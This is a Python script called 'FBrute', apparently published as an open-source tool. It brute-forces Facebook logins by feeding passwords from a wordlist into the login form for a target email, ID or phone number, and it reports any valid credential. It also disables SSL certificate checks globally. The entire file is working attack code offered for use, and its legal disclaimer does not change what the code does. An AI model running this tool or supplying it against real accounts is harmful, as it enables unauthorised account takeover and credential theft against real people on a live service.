#!/usr/bin/python

__author__   = "Black4nt"
__version__  = "0.1"
__email__    = "black4nt(dot)id(at)gmail(dot)com"
__homepage__ = "https://search.black4nt.ga"
__github__   = "https://github.com/Black4nt/python-facebook-bruteforcer"
__license__  = "MIT"


LEGAL_DISCLAIMER = "[!] legal disclaimer: usage of FBrute for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program."

BANNER = """\033[01;32m\
_____________________                  __           
\_   _____/\______   \_______  __ __ _/  |_   ____
 |    __)   |    |  _/\_  __ \|  |  \\\   __\_/ __ \ 
 |     \    |    |   \ |  | \/|  |  / |  |  \  ___/ 
 \___  /    |______  / |__|   |____/  |__|   \___  >
     \/            \/                            \/\033[0m\n
  + -- -=[ FBrute - Facebook Bruteforcer ]=- -- +
  + -- -=[  https://search.black4nt.ga   ]=- -- +
"""


####
# import module gan
####

import os
import re
import ssl
import sys
import time
import logging
import optparse
import mechanize

# setting up logger
logger = logging.getLogger("FBruteLog")
logger_handler = logging.StreamHandler(sys.stdout)
logger_formatter = logging.Formatter('\r[%(asctime)s] %(message)s', '%H:%M:%S')
logger_handler.setFormatter(logger_formatter)
logger.addHandler(logger_handler)
logger.setLevel(logging.DEBUG)

try: # refrensi: https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error
	ssl._create_default_https_context = ssl._create_unverified_context
except AttributeError:
	pass

####
# Facebook Bruteforcer By Black4nt
# Copyright (c) 2018 Black4nt
# Date: 10.07 20/04/2018
####

def run(email, wordlist, agent, timeout):
	now = time.strftime("%X")
	print (LEGAL_DISCLAIMER)
	print ("\n[*] starting at %s\n" % now)
	url = "https://www.facebook.com/login.php?login_attempt=1"
	regexp = re.compile(re.findall("/(.*)\?", url)[0])
	cj = mechanize.LWPCookieJar()
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_refresh(mechanize.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj); cj.clear()
	br.addheaders = [('User-agent', agent)]
	br.open(url, timeout=timeout)
	form = br.forms()[0]
	wordlist = open(wordlist, "rb").readlines()
	print ("\033[01;34m")
	msg = "target: " + email; logger.info(msg)
	msg = "wordlist: %d password" % len(wordlist); logger.info(msg)
	print ("\033[0m")
	while len(wordlist) <> 0:
		password = wordlist.pop(0).strip()
		msg = "trying credential => {0}:{1}".format(email, password); logger.info(msg)
		form["email"] = email
		form["pass"] = password
		response = br.open(form.click(), timeout=timeout)
		_url = response.geturl()
		if not regexp.search(_url) or regexp.pattern not in _url:
			print ("\033[01;32m")
			msg = "valid credential: "; logger.info(msg)
			msg = "email|id: " + email; logger.debug(msg)
			msg = "password: " + password; logger.debug(msg)
			print ("\033[0m")
			raise SystemExit

	msg = "password valid tidak ditemukan di wordlist anda: " + wordlist.name; logger.critical(msg)

def main():
	print (BANNER)
	parser = optparse.OptionParser(version=__version__+"#dev")
	try:
		parser.add_option("-t", "--target", dest="accountTarget", metavar="<target>", help="target bisa berupa (EM)ail, (ID) or (Phone Number)")
		parser.add_option("-w", "--wordlist", dest="wordList", metavar="<file>", help="file wordlist untuk mencari password target")
		parser.add_option("--timeout", dest="timeout", metavar="<sec>", type="float", help="waktu sebelum koneksi dimulai (default: 30)", default=30)
		parser.add_option("--user-agent", dest="agent", metavar="<agent>", help="HTTP user-agent header value (default: \"Mozilla 0.5\")", default="Mozilla 0.5")

		(args, _) = parser.parse_args()

		if not args.accountTarget:
			parser.error("try '-h' for more information")
	except (optparse.OptionError, TypeError) as e:
		parser.error(e)

	if args.accountTarget and args.wordList:
		try:
			if not os.path.isfile(args.wordList):
				msg = "no such file or directory: %s" % args.wordList; logger.critical(msg)
				raise SystemExit

			run(args.accountTarget, args.wordList, args.agent, args.timeout)
		except Exception as msg:
			logger.error(msg)

		except SystemExit:
			pass

		except KeyboardInterrupt as e:
			msg = "user aborted"; logger.warn(msg)

		finally:
			try:
				print ("\n[-] shutting down at %s\n\n" % time.strftime("%X"))
			except:
				pass
			return;

if __name__ == "__main__":
	main()